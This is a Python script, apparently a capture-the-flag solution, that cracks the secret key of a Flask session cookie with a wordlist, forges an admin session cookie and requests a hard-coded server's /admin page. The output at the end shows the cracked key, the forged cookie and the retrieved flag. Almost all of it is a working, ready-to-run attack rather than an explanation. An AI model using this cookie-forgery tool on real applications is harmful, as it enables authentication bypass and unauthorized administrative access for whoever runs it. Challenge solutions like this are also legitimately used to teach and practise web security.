import hashlib
import hmac
import base64
import json
import sys
import requests
import time
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

# ==========================================
# 1. SAMPLE COOKIE STRING
#    Run 'curl -v http://104.198.24.52:6011/' and copy the value.
"""
curl 'http://104.198.24.52:6011/' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36' \
  --insecure -vvv
"""
TARGET_COOKIE = "eyJyb2xlIjoidXNlciIsInVzZXIiOiJndWVzdCJ9.aTcwQg.qrNn08-0__PEydi0BhR6LCIOHfM"
# ==========================================

WORDLIST_PATH = "/usr/share/wordlists/rockyou.txt"

def b64_encode(data):
    """Urlsafe Base64 encode without padding"""
    return base64.urlsafe_b64encode(data).rstrip(b"=")

def derive_key(secret_key):
    """Mimic Flask's default key derivation (HMAC-SHA1 with salt 'cookie-session')"""
    return hmac.new(secret_key.encode(), b"cookie-session", hashlib.sha1).digest()

def calculate_signature(secret_key, value):
    """Calculate the signature for a given value"""
    key = derive_key(secret_key)
    sig = hmac.new(key, value.encode(), hashlib.sha1).digest()
    return b64_encode(sig).decode()

def crack(cookie, wordlist):
    print(f"[*] Cracking cookie signature...")

    try:
        # Flask cookies are payload.timestamp.signature
        parts = cookie.split(".")
        if len(parts) != 3:
            print("[-] Error: Cookie format invalid. Must be payload.timestamp.sig")
            return None
        
        # Match the signature of the first two parts
        unsigned_data = f"{parts[0]}.{parts[1]}"
        target_sig = parts[2]
    except Exception:
        print("[-] Error parsing cookie.")
        return None

    # Try a small internal list first (in case rockyou is missing)
    fallback_list = ["secret", "flask", "admin", "password", "123456", "secret_key", "qwertyuiop"]

    # Open wordlist safely
    f = None
    try:
        f = open(wordlist, "rb")
        iterator = f
    except FileNotFoundError:
        print(f"[!] {wordlist} not found. Using small fallback list.")
        iterator = [x.encode() for x in fallback_list]

    for line in iterator:
        secret = line.strip().decode("utf-8", errors="ignore")
        if not secret: continue

        # If our math matches the cookie's signature, we found the key
        if calculate_signature(secret, unsigned_data) == target_sig:
            print(f"\n[+] KEY FOUND: '{secret}'")
            if hasattr(f, 'close'): f.close()
            return secret
            
    print("[-] Key not found in wordlist.")
    if f and hasattr(f, 'close'): f.close()
    return None

def forge(secret):
    # Challenge Logic: user must be the reverse of the secret key
    target_user = secret[::-1]

    # 1. Create Payload
    new_data = {"user": target_user, "role": "admin"}
    print(f"[*] Forging payload: {new_data}")

    # 2. Setup Dummy Flask App to borrow the signer
    # We use this to access the exact same signing logic the server uses
    app = Flask("forger")
    app.secret_key = secret

    # 3. Generate the Cookie
    # This single line handles:
    #   - JSON Serialization (with correct separators)
    #   - Timestamp generation (in the correct binary+base64 format)
    #   - HMAC-SHA1 Signing
    serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    final_cookie = serializer.dumps(new_data)

    print(f"\n[+] FORGED ADMIN COOKIE:\n{final_cookie}")
    return final_cookie

def make_authenticated_request(target_url, cookie_value):
    """
    Sends a GET request to the target URL using the provided cookie.
 
    Args:
        target_url (str): The URL to request.
        cookie_value (str): The value of the session cookie.

    Returns:
        str: The response text if successful, None otherwise.
    """
    # 1. Define the cookies dictionary (replace 'JSESSIONID' with your actual cookie name)
    cookies = {
        'session': cookie_value.strip() # .strip() removes accidental newlines
    }

    # 2. Add a User-Agent so we look like a real browser (often required)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    try:
        # 3. Make the request with a 10-second timeout
        print(f"[*] Sending request to {target_url}...")
        response = requests.get(target_url, cookies=cookies, headers=headers, timeout=10)

        # 4. Check if the request was successful (200 OK)
        response.raise_for_status()

        print(f"[+] Success! Status Code: {response.status_code}")
        return response.text

    except requests.exceptions.HTTPError as http_err:
        print(f"[-] HTTP Error: {http_err}")
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection Error: Could not reach {target_url}")
    except requests.exceptions.Timeout:
        print("[-] Request timed out.")
    except Exception as err:
        print(f"[-] An unexpected error occurred: {err}")

    return None

if __name__ == "__main__":
    if "Paste_Your" in TARGET_COOKIE:
        print("[-] ERROR: Open the script and paste your cookie into TARGET_COOKIE first!")
        sys.exit()

    key = crack(TARGET_COOKIE, WORDLIST_PATH)

    if key:
        forged_key = forge(key)
        print(make_authenticated_request("http://104.198.24.52:6011/admin", forged_key))


"""
 % python3 jwt_cracker.py
[*] Cracking cookie signature...
[!] /usr/share/wordlists/rockyou.txt not found. Using small fallback list.

[+] KEY FOUND: 'qwertyuiop'
[*] Forging payload: {'user': 'poiuytrewq', 'role': 'admin'}

[+] FORGED ADMIN COOKIE:
eyJ1c2VyIjoicG9pdXl0cmV3cSIsInJvbGUiOiJhZG1pbiJ9.aTdS4g.M0RXiXPnnVEK_1SIAhZlVLlxYjQ
[*] Sending request to http://104.198.24.52:6011/admin...
[+] Success! Status Code: 200
<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Admin Panel</title>
  <style>
    body {
      font-family: "Segoe UI", Tahoma, sans-serif;
      background: #f4f6f8;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .card {
      background: #ffffff;
      padding: 40px 50px;
      border-radius: 14px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.12);
      text-align: center;
      max-width: 480px;
      width: 90%;
      animation: fadein 0.4s ease-in-out;
    }

    h1 {
      margin-bottom: 15px;
      color: #333;
      font-size: 28px;
    }

    p {
      font-size: 18px;
      color: #444;
      margin: 0;
      word-break: break-all;
    }

    .flag-box {
      background: #f9f9f9;
      padding: 15px;
      border-radius: 8px;
      border: 1px solid #ddd;
      font-family: "Courier New", monospace;
      margin-top: 12px;
    }

    @keyframes fadein {
      from { opacity: 0; transform: translateY(6px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>Admin Panel</h1>
    <p>Enjoy this cookie 🍪</p>
    <p><strong>Your Flag:</strong></p>
    <div class="flag-box">flag{y0u_l34rn3ed_flask_uns1gn_c0ok1e}</div>
  </div>
</body>
</html>
"""